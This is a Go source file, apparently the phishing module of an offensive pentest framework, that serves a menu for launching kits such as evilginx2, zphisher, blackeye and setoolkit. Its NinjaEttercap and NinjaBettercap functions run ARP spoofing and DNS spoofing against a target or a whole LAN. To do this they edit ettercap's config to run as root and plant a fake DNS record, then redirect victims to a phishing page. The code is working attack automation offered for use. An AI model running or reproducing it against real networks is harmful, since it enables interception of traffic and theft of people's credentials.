package phishers

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "banners"
    "strings"
    "bcolors"
    "scriptures"
    "subprocess"
)

var(
    Name = "beef"
    Pass = "Jesus"
    Iface = "eth0"
    LPort = "9999"
    Spoofer = "ettercap"
    FakeDns = "Jesus is coming soon"

    Lhost = LhostIp
    LhostIp, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Input, Rhost, Proxy, Function, Target string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{

    "rhost": "",
    "target": "",
    "function": "",
    "name": "beef",
    "iface": "eth0",
    "lport": "9999",
    "password": "Jesus",
    "spoofer": "ettercap",
    "fakedns": "Jesus is coming soon",

    "lhost": LhostIp,
    "output": OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func PhishingPentest() {
    for {
        fmt.Printf("%s%safr3%s phishers(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{
        // Info/Help commands
        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},
        {[]string{"o", "junks", "outputs", "clear junks", "clear outputs"}, utils.ListJunks},
        {[]string{"logs", "history", "clear logs", "clear history"}, subprocess.LogHistory},

        // Run/exec commands
        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        // Set commands
        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        // Other commands
        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        // Setup commands
        {[]string{"info"}, menus.HelpInfoPhishers},
        {[]string{"m", "menu"}, menus.MenuSeven},
        {[]string{"option", "options", "show option", "show options"}, menus.PhishersOptions},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListPhishersFunctions},

        // Commands executions
        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run gophish", "use gophish", "exec gophish", "start gophish", "launch gophish", "exploit gophish", "execute gophish"}, func() { GoPhish() }},
        {[]string{"? 1", "info 1", "help 1", "gophish", "info gophish", "help gophish"}, menus.HelpInfoGoPhish},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run goodginx", "use goodginx", "exec goodginx", "start goodginx", "launch goodginx", "exploit goodginx", "execute goodginx"}, func() { GoodGinx() }},
        {[]string{"? 2", "info 2", "help 2", "goodginx", "info goodginx", "help goodginx"}, menus.HelpInfoGoodGinx},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run zphisher", "use zphisher", "exec zphisher", "start zphisher", "launch zphisher", "exploit zphisher", "execute zphisher"}, func() { ZPhisher() }},
        {[]string{"? 3", "info 3", "help 3", "zphisher", "info zphisher", "help zphisher"}, menus.HelpInfoZPhisher},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run blackeye", "use blackeye", "exec blackeye", "start blackeye", "launch blackeye", "exploit blackeye", "execute blackeye"}, func() { BlackEye() }},
        {[]string{"? 4", "info 4", "help 4", "blackeye", "info blackeye", "help blackeye"}, menus.HelpInfoBlackEye},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run advphisher", "use advphisher", "exec advphisher", "start advphisher", "launch advphisher", "exploit advphisher", "execute advphisher"}, func() { AdvPhisher() }},
        {[]string{"? 5", "info 5", "help 5", "advphisher", "info advphisher", "help advphisher"}, menus.HelpInfoAdvPhisher},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run darkphish", "use darkphish", "exec darkphish", "start darkphish", "launch darkphish", "exploit darkphish", "execute darkphish"}, func() { DarkPhish() }},
        {[]string{"? 6", "info 6", "help 6", "darkphish", "info darkphish", "help darkphish"}, menus.HelpInfoDarkPhish},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run shellphish", "use shellphish", "exec shellphish", "start shellphish", "launch shellphish", "exploit shellphish", "execute shellphish"}, func() { ShellPhish() }},
        {[]string{"? 7", "info 7", "help 7", "shellphish", "info shellphish", "help shellphish"}, menus.HelpInfoShellPhish},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run setoolkit", "use setoolkit", "exec setoolkit", "start setoolkit", "launch setoolkit", "exploit setoolkit", "execute setoolkit"}, func() { SetoolKit() }},
        {[]string{"? 8", "info 8", "help 8", "setoolkit", "info setoolkit", "help setoolkit"}, menus.HelpInfoSetoolKit},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run thc", "use thc", "exec thc", "start thc", "launch thc", "exploit thc", "execute thc"}, func() { Thc() }},
        {[]string{"? 9", "info 9", "help 9", "thc", "info thc", "help thc"}, menus.HelpInfoThc},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }
 
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    PhishingPenFunctions(Function)
}

// Helper functions
func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func PhishingPenFunctions(Function string, args ...interface{}) {
    fmt.Printf("\nFunction => %s\n", Function)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func() {

        "gophish": func() {GoPhish()},
       "goodginx": func() {GoodGinx()},
       "zphisher": func() {ZPhisher()},
       "blackeye": func() {BlackEye()},
       "advphish": func() {AdvPhisher()},
      "DarkPhish": func() {DarkPhish()},
      "setoolkit": func() {SetoolKit()},
            "thc": func() {Thc()},
     "shellphish": func() {ShellPhish()},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
    }
}




func GoPhish() {
    subprocess.Popen(`gophish`)
}

func GoodGinx() {
    subprocess.Popen(`evilginx2`)
}

func Thc() {
    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, ToolsDir)
}

func SetoolKit() {
    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, ToolsDir)
}

func ZPhisher() {
    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, ToolsDir)
}

func BlackEye() {
    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, ToolsDir)
}

func ShellPhish() {
    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, ToolsDir)
}

func DarkPhish() {
    subprocess.Popen(`cd %s/phishers/darkphish/; python3 dark-phish.py`, ToolsDir)
}

func AdvPhisher() {
    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, ToolsDir)
}

func CyberPhish() {
    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, ToolsDir)
}

func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    scanner.Scan()
    Input := scanner.Text()
    switch strings.ToLower(Input) {
    case "0":
        return
    case "1":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, Rhost, Gateway)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    case "2":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j RedIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    default:
        utils.SystemShell(Input)
    }
    fmt.Println()
}

func NinjaBettercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Target == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(Target) {
    case "one":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, Rhost)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    case "all":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter TARGET. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
}

func NinjaPhish(Spoofer string, Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Spoofer == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    switch strings.ToLower(Spoofer) {
    case "ettercap":
         NinjaEttercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    case "bettercap":
         NinjaBettercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
     }
}
